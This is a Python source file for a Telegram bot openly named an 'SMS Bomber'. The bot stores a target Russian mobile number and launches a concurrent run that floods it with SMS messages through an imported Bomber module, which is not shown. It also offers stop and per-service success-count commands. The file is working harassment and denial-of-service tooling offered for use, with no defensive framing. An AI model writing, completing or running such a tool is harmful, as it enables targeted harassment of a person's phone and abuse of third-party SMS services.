#!/usr/bin/env python3
"""Telegram SMS Bomber Bot — core entry point.

Commands:
  /set <phone>  — Store target phone number
  /start        — Begin sending SMS bombs
  /stop         — Stop the bombing run
  /stats        — Show success/error counts per service
  /help         — Show available commands
"""

import asyncio
import logging
import os
import sys
import time
from typing import Optional

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Add project root to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from bomber import Bomber
from logger import setup_logging
from phone_utils import format_phone_ru, validate_ru_phone
from stats import BombStats

# ---------------------------------------------------------------------------
# Configuration (override via env vars or a .env file)
# ---------------------------------------------------------------------------
BOT_TOKEN = os.environ.get("SMS_BOT_TOKEN", "")
STATS_FILE = os.environ.get("SMS_STATS_FILE", "bomber_stats.json")
LOG_FILE = os.environ.get("SMS_LOG_FILE", "bomber.log")
LOG_LEVEL = os.environ.get("SMS_LOG_LEVEL", "INFO")
CONCURRENCY = int(os.environ.get("SMS_CONCURRENCY", "15"))

log = setup_logging(
    level=getattr(logging, LOG_LEVEL.upper(), logging.INFO),
    log_file=LOG_FILE,
)

# ---------------------------------------------------------------------------
# Global state (per-bot-process, not persistent across restarts)
# ---------------------------------------------------------------------------
target_phone: Optional[str] = None
bomber: Optional[Bomber] = None
bomb_task: Optional[asyncio.Task] = None
cumulative_stats: Optional[BombStats] = None


# ---------------------------------------------------------------------------
# Command handlers
# ---------------------------------------------------------------------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /set <phone> — store target number."""
    global target_phone

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Usage: /set <phone>\n"
            "Example: /set +79161234567\n"
            "         /set 89161234567\n"
            "         /set 9161234567"
        )
        return

    raw_phone = args[0].strip()
    if not validate_ru_phone(raw_phone):
        await update.message.reply_text(
            f"❌ Invalid phone: {raw_phone}\n"
            "Must be a Russian mobile number starting with +7, 8, or 9."
        )
        return

    target_phone = raw_phone
    formats = format_phone_ru(raw_phone)
    await update.message.reply_text(
        f"✅ Target set: {formats['+7']}\n"
        f"Use /start to begin bombing."
    )
    log.info(f"Target phone set: {formats['+7']}")


async def cmd_begin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start — launch the bomber."""
    global bomber, bomb_task, target_phone, cumulative_stats

    if not target_phone:
        await update.message.reply_text(
            "❌ No target set! Use /set <phone> first."
        )
        return

    if bomber and bomber.is_running:
        await update.message.reply_text(
            "⏳ Already bombing! Use /stop to halt or /stats to see progress."
        )
        return

    await update.message.reply_text(
        f"🔥 Starting SMS bomb on {format_phone_ru(target_phone)['+7']}...\n"
        f"Use /stop to halt, /stats to see progress."
    )

    bomber = Bomber(concurrency=CONCURRENCY)

    async def _run_bomb():
        global cumulative_stats
        try:
            stats = await bomber.attack(target_phone)
            cumulative_stats = stats
            # Save stats to file
            stats.save(STATS_FILE)
            return stats
        except Exception as e:
            log.error(f"Bomber error: {e}", exc_info=True)
            return None

    bomb_task = asyncio.create_task(_run_bomb())


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop — halt the bomber."""
    global bomber, bomb_task

    if not bomber or not bomber.is_running:
        await update.message.reply_text(
            "ℹ️ No bombing in progress. Use /start to begin."
        )
        return

    bomber.stop()

    await update.message.reply_text(
        "🛑 Stopping... Use /stats to see final counts."
    )
    log.info("Bombing stopped by user command")


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats — show current statistics."""
    global bomber, cumulative_stats

    stats = None
    if bomber and bomber.stats.total > 0:
        stats = bomber.stats
    elif cumulative_stats and cumulative_stats.total > 0:
        stats = cumulative_stats
    elif os.path.exists(STATS_FILE):
        stats = BombStats.load(STATS_FILE)

    if not stats or stats.total == 0:
        await update.message.reply_text(
            "📊 No stats yet. Use /start to begin bombing."
        )
        return

    running_status = "🟢 RUNNING" if (bomber and bomber.is_running) else "🔴 STOPPED"
    summary = stats.summary()
    # Telegram has a 4096 char limit — trim if needed
    if len(summary) > 4000:
        summary = summary[:3990] + "\n... (truncated)"
    await update.message.reply_text(
        f"{running_status}\n\n{summary}"
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help — show usage."""
    await update.message.reply_text(
        "📋 *SMS Bomber Bot — Commands*\n\n"
        "`/set <phone>`  — Store target phone number\n"
        "`/start`        — Begin sending SMS\n"
        "`/stop`         — Stop the bombing run\n"
        "`/stats`        — Show success/error counts\n"
        "`/help`         — Show this help\n\n"
        "*Examples:*\n"
        "`/set +79161234567`\n"
        "`/set 89161234567`\n"
        "`/set 9161234567`",
        parse_mode="Markdown",
    )


# ---------------------------------------------------------------------------
# Background task: poll bomb_task and send results when done
# ---------------------------------------------------------------------------
async def _monitor_bomb_task(app: Application):
    """Background coroutine that waits for bomb_task and reports results."""
    global bomb_task, bomber, cumulative_stats

    while True:
        if bomb_task and bomb_task.done():
            try:
                stats = bomb_task.result()
                if stats:
                    log.info(f"Bomb finished: {stats.summary()}")
                else:
                    log.warning("Bomb task completed with no stats")
            except asyncio.CancelledError:
                log.info("Bomb task was cancelled")
            except Exception as e:
                log.error(f"Bomb task failed: {e}")
            finally:
                bomb_task = None
        await asyncio.sleep(1)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
def main():
    if not BOT_TOKEN:
        log.critical(
            "❌ SMS_BOT_TOKEN environment variable not set!\n"
            "   export SMS_BOT_TOKEN='your_telegram_bot_token'"
        )
        sys.exit(1)

    log.info("🤖 Starting SMS Bomber Telegram Bot...")

    app = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    app.add_handler(CommandHandler("set", cmd_start))
    app.add_handler(CommandHandler("start", cmd_begin))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("help", cmd_help))

    # Start background monitor
    app.create_task(_monitor_bomb_task(app))

    log.info("✅ Bot initialized. Starting polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
